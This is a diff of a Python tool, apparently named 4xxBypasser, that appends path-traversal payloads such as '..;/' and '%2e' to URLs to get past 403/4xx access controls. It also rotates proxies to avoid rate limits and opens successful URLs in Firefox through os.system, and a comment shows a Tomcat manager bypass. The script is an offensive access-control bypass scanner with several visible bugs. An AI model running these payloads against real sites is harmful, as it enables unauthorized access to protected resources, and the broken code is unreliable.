@@ -1,114 +1,153 @@
+# A FAIRE :
+
+# finir la fonction output
+# finir le compteur
+# optimiser le code
+# --------------------------------
+
+from banner import banner
+
+from sys import exc_info
+from time import sleep
+
+import os
 import requests
 import json
 import argparse
-
-from os import system
-from time import sleep
-
 import urllib3
+import textwrap
 
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
-print("""
-\033[91m
- ___         _____                             
-| | |_ _ _ _| __  |_ _ ___ ___ ___ ___ ___ ___ 
-|_  |_'_|_'_| __ -| | | . | .'|_ -|_ -| -_|  _|
-  |_|_,_|_,_|_____|_  |  _|__,|___|___|___|_|  
-                  |___|_|       
-\033[0m
-\033[92m[+]\033[0m \033[28mCreator : \033[4mRistBS\033[0m
-\033[93m[?]\033[0m \033[28mInfo : cet outil à été crée pour contourner les réponses d'erreur coté client ( 4xx ) \033[0m
-\033[91m[!]\033[0m \033[28mUtilisez cet outil dans un cadre légal !\033[0m\n\n""")
-
-parser = argparse.ArgumentParser(description='outil pour contourner les code etats 4xx')
-parser.add_argument('url', help='entrer url avec nom de domaine seulement')
-parser.add_argument('--path', help='donner le chemin qui a comme reponse 4xx')
-parser.add_argument('--params', help='donner les paramètres nécessaires pour avoir une réponses valide')
-parser.add_argument('--proxy', help='utilisez des proxy pour empecher la limite de requetes')
-parser.add_argument('--batch', action='store_true', help='répond de facon positive à toute demande')
-parser.add_argument('-o', '--output', type=str, help='enregistrer une copie des résultats')
-args = parser.parse_args()
+def args_manager():
+    global parser
+    parser = argparse.ArgumentParser(description='tool to bypass client side error code 4xx')
+    parser.add_argument('url', help='enter the URL with domain only')
+    parser.add_argument('--path', help='give the path which has the answer 4xx')
+    parser.add_argument('--params', help='give the necessary parameters to have a valid answer')
+    parser.add_argument('--proxy', help='use proxies to avoid requests limit')
+    parser.add_argument('--batch', action='store_true', help='responds positively to any request')
+    parser.add_argument('--useragent', help='use another user-agent than the one defined by python')
+    parser.add_argument('-o', '--output', type=str, help='save the results in a file')
+    global args
+    args = parser.parse_args()
 
 
-def network():
-	try:
-		requests.get('https://github.com', timeout = 3)
-		print ("\n\033[61m[+] recherche de connexion wifi\033[0m")
-		print ("\n\033[32m[+]\033[0m Wifi trouvé et fonctionnel !\n")
-	except requests.ConnectionError:
-		print ("\033[91m[!]\033[0m aucune connexion internet")
-		exit()
+def connection_check():
+    print ("\n\033[61m[~] Trying to find internet connection\033[0m")
+    try:
+        requests.get('https://github.com', timeout = 3)
+        print ("\n\033[32m[+]\033[0m connection found !\n")
+    except requests.ConnectionError:
+        print ("\033[91m[-]\033[0m no internet connection")
+        exit()
+
+def output(response, *args, **kwargs):
+    #word = ["X-Powered-By", "User-Agent", "chunked"]
+    headers = lambda d: '\n'.join(f'{k}: {v}' for k, v in d.items()) 
+    print(textwrap.dedent('''
+        ---------------- request ----------------
+        \033[92m{req.method}\033[0m {req.url}
+        {reqhdrs}
+
+        {req.body}
+        ---------------- response ----------------
+        \033[91m{res.status_code}\033[0m {res.reason} {res.url}
+        \033[92m{reshdrs}\033[0m
+    ''').format(req=response.request, res=response, reqhdrs=headers(response.request.headers), reshdrs=headers(response.headers),))
 
 #class exploit:
 def payload_tester():
+
     params = args.params
     proxies = args.proxy
-    #args.params
-    print("Paramètres : {}".format(params))
+    user_agent = {'User-agent': '{}'.format(args.useragent)}
+
+    print(f"Parameter : {params}")
+    print(f"Proxy : {proxies}")
+    print(f"User-Agent : {user_agent}")
+    
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     requests.packages.urllib3.disable_warnings()
     payloads = ['%2e', '/.', '..;/', '//', '/./', '/']
+
     try:
         for payload in payloads:
-            print("\033[92m[+]\033[0m \033[4mTest des payloads suivant \033[0m:")
+            print("\033[92m\n\n[+]\033[0m \033[4mTesting the following payload \033[0m:")
             sleep(3)
             if args.url and args.path:
                 link = args.url + payload + args.path
-                r = requests.get(link, params=params, verify=False, proxies=proxies)
-                if r.status_code == 200:
-                    print("positif pour : {}".format(link))
-                elif r.status_code == 400 or 500 or 404:
-                    print("négatif pour : {} ".format(link))
+                r = requests.get(link, params=params, verify=False, proxies=proxies, hooks={'response': output}, headers=user_agent)
+
+                positives_numbers_code = [200, 300, 102]
+                negatives_numbers_code = [500, 404, 403]
+                all_number_code = positives_numbers_code + negatives_numbers_code
+                for code_number in positives_numbers_code:
+                    if r.status_code == code_number:
+                        print(f"[+] True with code {code_number} for : {link}")
+                for code_number in negatives_numbers_code:
+                    if r.status_code == code_number:
+                        print(f"[+] False with code {code_number} for : {link}")
+                    elif r.status_code == 401:
+                        print(f"[?] it may be a True result but some parameters was not set")
+
+                if args.batch:
+                    firefox_launcher(link, True)
                 else:
-                    print("[?] Résultat peut etre positif mais certains paramètres n'ont pas été pris en compte.")
-                for result in r:
-                    print("Reponse :" + str(r.status_code))
-                    launch = input("Lancer l'url modifié dans firefox ? [Y,N] : ")
-                    if launch == 'Y' or 'y':
-                       #system('firefox "http://ip/manager/..;/manager/html" ')
-                        system('firefox {}'.format(link))
-                    elif args.batch:
-                        print("l'argument batch est pris en compte...")
-                        system('firefox {}'.format(link))
-                    elif launch == 'N':
-                        print(result)
+                    firefox_launcher(link)
                         
-                    break
-                print("URL :" + args.url + payload + args.path) # 2x args.path ( url -(ici)- payload )
+                print("URL :" + args.url + payload + args.path) # 2x args.path ( url -(here)- payload )
                 print("payload : \033[91m{}\033[0m".format(payload))
                 count = len(payloads)
+
+        #for positives_numbers_code in r.status_code:
+         #   print(f"\n\033[91m[!]\033[0m Résultat trouvé. {str(positives_numbers_code)}/" + str(count))
+        code_number = str(code_number)
+        o = sum(int(n) for n in code_number)
+        print(o)
+        print(code_number)
+        print(all_number_code)
+
         if args.output:
-            f = open(args.output, "w")
-            f.write(str(result))
-            f.close
+            output_file()
+        
     except requests.exceptions.ConnectionError:
         print("Connection refused")
         sleep(12)
+        
 
-    positive = 401, 200, 300
-    for positive in r.status_code:
-        print("\n\033[91m[!]\033[0m résultat trouvé. {}/" + str(count).format(str(positive)))
-#def firefox():
-    #launch = input("Lancer l'url modifié dans firefox ? [Y,N] : ")
-    #if launch == 'Y' or 'y':
-        #system('firefox "http://ip/manager/..;/manager/html" ')
-     #   payload = '..;'
-      #  system('firefox {}'.format(args.url, payload, args.path))
-    #else:
-     #   print("[!] - good bye")
-      #  exit()
+    except requests.exceptions.RequestException or requests.exceptions.HTTPError as e:
+        raise SystemExit(e)
+
+def output_file():
+    f_output = output(response=output)
+    file = open(args.output)
+    try:
+        with open(args.output, 'w') as file:
+            file.write(f_output)
+            file.close()
+    except IOError as e:
+        print("I/O error({0}): {1}".format(e.errno, e.strerror))
+
+def firefox_launcher(link, batch=False):
+    if batch == True :
+        os.system(f'firefox {link}')
+    else:
+        launch = input("launch the modified URL with firefox ? [Y,N] : ")
+        if launch == 'Y' or launch == 'y':
+            os.system(f'firefox {link}')
+        else:
+            print("[!] Firefox will not be launch for this URL")
+
 
 def main():
-    network()
+    banner()
+    args_manager()
+    connection_check()
     payload_tester()
-    #firefox()
 
-main()
+if __name__ == "__main__":
+    main()
 
-# A FAIRE :
-# ajouts des autres arguments, user-agent, proxy, params
-# gérer les payloads /? et /?? avec cURL
-# optimiser le code
 
